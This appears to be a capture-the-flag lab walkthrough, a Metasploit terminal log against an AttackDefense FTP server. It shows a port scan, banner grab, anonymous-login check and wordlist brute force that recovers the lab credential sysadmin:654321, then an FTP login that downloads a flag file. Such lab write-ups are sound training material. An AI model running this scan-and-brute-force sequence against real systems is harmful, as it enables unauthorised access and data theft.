@@ -1,0 +1,75 @@
+Step 1:
+┌──(root㉿INE)-[~]
+└─# service postgresql start
+  Starting PostgreSQL 16 database server: main.
+
+┌──(root㉿INE)-[~]
+└─# msfconsole
+  Metasploit tip: Set the current module's RHOSTS with database values using 
+  hosts -R or services -R
+
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.165.123.3
+  RHOSTS => 192.165.123.3
+  msf6 auxiliary(scanner/portscan/tcp) > exploit
+  
+  [+] 192.165.123.3:        - 192.165.123.3:21 - TCP OPEN
+  [*] 192.165.123.3:        - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/ftp/ftp_version 
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.165.123.3
+  RHOSTS => 192.165.123.3
+msf6 auxiliary(scanner/ftp/ftp_version) > exploit
+
+  [+] 192.165.123.3:21      - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.165.123.3]\x0d\x0a'
+  [*] 192.165.123.3:21      - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 2:
+--Anonymous Login
+msf6 auxiliary(scanner/ftp/ftp_version) > use auxiliary/scanner/ftp/anonymous
+msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.165.123.3
+  RHOSTS => 192.165.123.3
+  msf6 auxiliary(scanner/ftp/anonymous) > exploit
+  
+  [*] 192.165.123.3:21      - Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+--Brute Force Login
+msf6 auxiliary(scanner/ftp/anonymous) > use auxiliary/scanner/ftp/ftp_login
+msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.165.123.3
+  RHOSTS => 192.165.123.3
+msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+  USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+  PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > exploit
+  [+] 192.165.123.3:21      - 192.165.123.3:21 - Login Successful: sysadmin:654321
+
+Step 3:
+msf6 auxiliary(scanner/ftp/ftp_login) > ftp sysadmin@192.165.123.3
+  [*] exec: ftp sysadmin@192.165.123.3
+  
+  Connected to 192.165.123.3.
+  220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.165.123.3]
+  331 Password required for sysadmin
+Password: 
+  230 User sysadmin logged in
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+ftp> ls
+  229 Entering Extended Passive Mode (|||4923|)
+  150 Opening ASCII mode data connection for file list
+  -rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
+  226 Transfer complete
+ftp> get secret.txt
+  local: secret.txt remote: secret.txt
+  229 Entering Extended Passive Mode (|||8718|)
+  150 Opening BINARY mode data connection for secret.txt (33 bytes)
+  100% |**************************************************************************************************************|    33      511.53 KiB/s    00:00 ETA
+  226 Transfer complete
+  33 bytes received in 00:00 (90.77 KiB/s)
+
+┌──(root㉿INE)-[~]
+└─# cat secret.txt                                                                                                                                         
+260ca9dd8a4577fc00b7bd5810298076
